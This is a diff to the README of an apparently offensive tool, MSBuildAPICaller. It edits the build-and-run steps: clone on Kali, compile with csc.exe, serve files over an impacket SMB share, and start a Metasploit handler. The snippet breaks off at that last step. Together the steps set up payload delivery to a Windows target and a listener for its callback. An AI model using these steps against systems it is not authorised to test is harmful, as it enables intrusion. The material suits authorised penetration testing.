@@ -4,7 +4,7 @@
 
 # How to build and execute
 
-## Step 0: git clone this repo on your Kali Linux
+## Step 0: git clone this repo on your Kali Linux machine
 
 ```
 git clone https://github.com/xax007/MSBuildAPICaller
@@ -47,11 +47,12 @@ Replace `AssemblyFile` variable in msbuildapicaller.csproj file with the locatio
 C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /reference:"Microsoft.Build.Framework.dll";"Microsoft.Build.dll";"Microsoft.Build.Engine.dll";"Microsoft.Build.Utilities.v4.0.dll";"System.Runtime.dll" /target:exe msbuildapicaller.cs
 ```
 
-## Step 6: Start a SMB Server via impacket
+## Step 6: Start a SMB Server via impacket on Kali Linux
 
 ```
-impacket-smbserver pentestlab /msbuild -smb2support
+impacket-smbserver share /msbuild -smb2support
 ```
+
 ## Step 7: Start a Metasploit exploit handler
 ```
 $ msfdb run
